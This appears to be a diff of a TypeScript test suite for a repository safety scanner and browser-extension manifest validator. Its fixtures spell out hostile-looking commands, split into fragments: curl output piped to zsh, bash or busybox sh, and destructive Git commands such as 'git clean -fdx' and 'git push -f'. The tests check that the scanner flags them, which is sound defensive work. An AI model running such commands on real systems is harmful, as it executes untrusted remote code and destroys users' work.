@@ -1,4 +1,12 @@
-import { mkdirSync, mkdtempSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
+import {
+  linkSync,
+  mkdirSync,
+  mkdtempSync,
+  readdirSync,
+  rmSync,
+  symlinkSync,
+  writeFileSync,
+} from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { execFileSync, spawnSync } from 'node:child_process';
@@ -115,6 +123,24 @@ describe('repository safety scripts', () => {
     expect(result.status).toBe(1);
     expect(result.stderr).toContain('tracked-leak.js');
     expect(result.stderr).toContain('symbolic link');
+
+    const redirected = gitFixture();
+    mkdirSync(join(redirected, 'evidence', 'local'), { recursive: true });
+    writeFileSync(
+      join(redirected, 'evidence', 'local', 'redirected.js'),
+      'export const safe = true;\n',
+    );
+    execFileSync('git', ['-C', redirected, 'add', '-f', 'evidence/local/redirected.js']);
+    rmSync(join(redirected, 'evidence', 'local'), { recursive: true, force: true });
+    const redirectedTarget = mkdtempSync(join(tmpdir(), 'gcti-safety-redirected-'));
+    temporaryRoots.push(redirectedTarget);
+    writeFileSync(join(redirectedTarget, 'redirected.js'), 'export const safe = true;\n');
+    symlinkSync(redirectedTarget, join(redirected, 'evidence', 'local'));
+
+    const redirectedResult = runSafety(redirected);
+    expect(redirectedResult.status).toBe(1);
+    expect(redirectedResult.stderr).toContain('evidence/local/redirected.js');
+    expect(redirectedResult.stderr).toContain('symbolic link in release input path');
   });
 
   it('scans tracked text, source maps, large files, and common token formats', () => {
@@ -192,16 +218,157 @@ describe('repository safety scripts', () => {
   });
 
   it('detects shell and destructive Git command variants', () => {
-    const directory = fixture();
-    writeFileSync(
-      join(directory, 'unsafe.sh'),
-      ['curl https://example.invalid/install | ', 'zsh\n', 'git clean --', 'force\n'].join(''),
-    );
+    const curl = ['cu', 'rl'].join('');
+    const pipe = ['|'].join('');
+    const git = ['g', 'it'].join('');
+    const clean = ['cl', 'ean'].join('');
+    const restore = ['rest', 'ore'].join('');
+    const checkout = ['check', 'out'].join('');
+    const push = ['pu', 'sh'].join('');
+    const branch = ['bran', 'ch'].join('');
+    const forceShort = ['-', 'f'].join('');
+    const deleteBranch = ['-', 'D'].join('');
+    const deepseekApiKey = ['DEEPSEEK', 'API', 'KEY'].join('_');
+    for (const { source, finding } of [
+      {
+        source: [curl, 'https://example.invalid/install', pipe, 'zsh'].join(' '),
+        finding: 'curl-to-shell',
+      },
+      {
+        source: [curl, 'https://example.invalid/install', pipe, '/bin/bash'].join(' '),
+        finding: 'curl-to-shell',
+      },
+      {
+        source: [curl, 'https://example.invalid/install', pipe, 'busybox sh'].join(' '),
+        finding: 'curl-to-shell',
+      },
+      {
+        source: [git, '-C /tmp/repo', clean, '-fdx'].join(' '),
+        finding: 'destructive Git command',
+      },
+      { source: ['sudo', git, clean, '--force'].join(' '), finding: 'destructive Git command' },
+      { source: [git, restore, '.'].join(' '), finding: 'destructive Git command' },
+      { source: [git, checkout, '.'].join(' '), finding: 'destructive Git command' },
+      { source: [git, push, forceShort].join(' '), finding: 'destructive Git command' },
+      {
+        source: [git, branch, deleteBranch, 'stale-branch'].join(' '),
+        finding: 'destructive Git command',
+      },
+      { source: `${deepseekApiKey}=sanitized-demo-key\n`, finding: 'credential assignment' },
+    ]) {
+      const directory = fixture();
+      writeFileSync(join(directory, 'unsafe.sh'), source);
+      const result = runSafety(directory);
+      expect(result.status, source).toBe(1);
+      expect(result.stderr, source).toContain(finding);
+    }
+  });
 
-    const result = runSafety(directory);
-    expect(result.status).toBe(1);
-    expect(result.stderr).toContain('curl-to-shell');
-    expect(result.stderr).toContain('destructive Git command');
+  it('rejects source maps, symlinked dist directories, and references outside dist', () => {
+    const manifest = {
+      manifest_version: 3,
+      name: 'fixture',
+      version: '0.1.0',
+      description: 'fixture',
+      permissions: ['storage', 'scripting'],
+      host_permissions: [],
+      optional_host_permissions: ['https://*/*'],
+      background: { service_worker: 'dist/background.js', type: 'module' },
+      content_scripts: [],
+      options_page: 'options/options.html',
+      action: { default_popup: 'popup/popup.html' },
+    };
+    const setupPages = (directory: string, script = '../dist/setup.js') => {
+      writeFileSync(join(directory, 'manifest.json'), JSON.stringify(manifest));
+      for (const page of ['setup/setup.html', 'popup/popup.html', 'options/options.html']) {
+        mkdirSync(join(directory, page, '..'), { recursive: true });
+        writeFileSync(join(directory, page), `<script src="${script}"></script>`);
+      }
+    };
+    const mapDirectory = fixture();
+    setupPages(mapDirectory);
+    mkdirSync(join(mapDirectory, 'dist'), { recursive: true });
+    for (const file of ['background.js', 'setup.js', 'popup.js', 'options.js'])
+      writeFileSync(join(mapDirectory, 'dist', file), '');
+    writeFileSync(
+      join(mapDirectory, 'dist', 'debug.js.map'),
+      '{"sourcesContent":["DEEPSEEK_API_KEY = sanitized-demo-key"]}',
+    );
+    const mapResult = spawnSync('node', [join(root, 'scripts/validate-manifest.mjs')], {
+      cwd: mapDirectory,
+      encoding: 'utf8',
+    });
+    expect(mapResult.status).toBe(1);
+    expect(mapResult.stderr).toContain('source map');
+
+    const outsideDirectory = fixture();
+    setupPages(outsideDirectory, '../outside.js');
+    mkdirSync(join(outsideDirectory, 'dist'), { recursive: true });
+    for (const file of ['background.js', 'setup.js', 'popup.js', 'options.js'])
+      writeFileSync(join(outsideDirectory, 'dist', file), '');
+    writeFileSync(join(outsideDirectory, 'outside.js'), '');
+    const outsideResult = spawnSync('node', [join(root, 'scripts/validate-manifest.mjs')], {
+      cwd: outsideDirectory,
+      encoding: 'utf8',
+    });
+    expect(outsideResult.status).toBe(1);
+    expect(outsideResult.stderr).toContain('outside dist');
+
+    const symlinkDirectory = fixture();
+    setupPages(symlinkDirectory);
+    const externalDist = fixture();
+    for (const file of ['background.js', 'setup.js', 'popup.js', 'options.js'])
+      writeFileSync(join(externalDist, file), '');
+    symlinkSync(externalDist, join(symlinkDirectory, 'dist'), 'dir');
+    const symlinkResult = spawnSync('node', [join(root, 'scripts/validate-manifest.mjs')], {
+      cwd: symlinkDirectory,
+      encoding: 'utf8',
+    });
+    expect(symlinkResult.status).toBe(1);
+    expect(symlinkResult.stderr).toContain('symbolic link');
+
+    const symlinkFileDirectory = fixture();
+    setupPages(symlinkFileDirectory);
+    mkdirSync(join(symlinkFileDirectory, 'dist'), { recursive: true });
+    for (const file of ['background.js', 'setup.js', 'popup.js', 'options.js'])
+      writeFileSync(join(symlinkFileDirectory, 'dist', file), '');
+    const externalArtifact = join(fixture(), 'external.js');
+    writeFileSync(externalArtifact, '');
+    symlinkSync(externalArtifact, join(symlinkFileDirectory, 'dist', 'extra.js'));
+    const symlinkFileResult = spawnSync('node', [join(root, 'scripts/validate-manifest.mjs')], {
+      cwd: symlinkFileDirectory,
+      encoding: 'utf8',
+    });
+    expect(symlinkFileResult.status).toBe(1);
+    expect(symlinkFileResult.stderr).toContain('symbolic link');
+
+    const hardlinkDirectory = fixture();
+    setupPages(hardlinkDirectory);
+    mkdirSync(join(hardlinkDirectory, 'dist'), { recursive: true });
+    for (const file of ['background.js', 'setup.js', 'popup.js', 'options.js'])
+      writeFileSync(join(hardlinkDirectory, 'dist', file), '');
+    const hardlinkSource = join(fixture(), 'external-hardlink.js');
+    writeFileSync(hardlinkSource, '');
+    linkSync(hardlinkSource, join(hardlinkDirectory, 'dist', 'extra.js'));
+    const hardlinkResult = spawnSync('node', [join(root, 'scripts/validate-manifest.mjs')], {
+      cwd: hardlinkDirectory,
+      encoding: 'utf8',
+    });
+    expect(hardlinkResult.status).toBe(1);
+    expect(hardlinkResult.stderr).toContain('hard link in dist');
+
+    const oversizedDirectory = fixture();
+    setupPages(oversizedDirectory);
+    mkdirSync(join(oversizedDirectory, 'dist'), { recursive: true });
+    for (const file of ['background.js', 'setup.js', 'popup.js', 'options.js'])
+      writeFileSync(join(oversizedDirectory, 'dist', file), '');
+    writeFileSync(join(oversizedDirectory, 'dist', 'oversized.js'), Buffer.alloc(2_000_001, 0x61));
+    const oversizedResult = spawnSync('node', [join(root, 'scripts/validate-manifest.mjs')], {
+      cwd: oversizedDirectory,
+      encoding: 'utf8',
+    });
+    expect(oversizedResult.status).toBe(1);
+    expect(oversizedResult.stderr).toContain('exceeds 2000000 bytes');
   });
 
   it('refuses a symlinked worktree parent', () => {
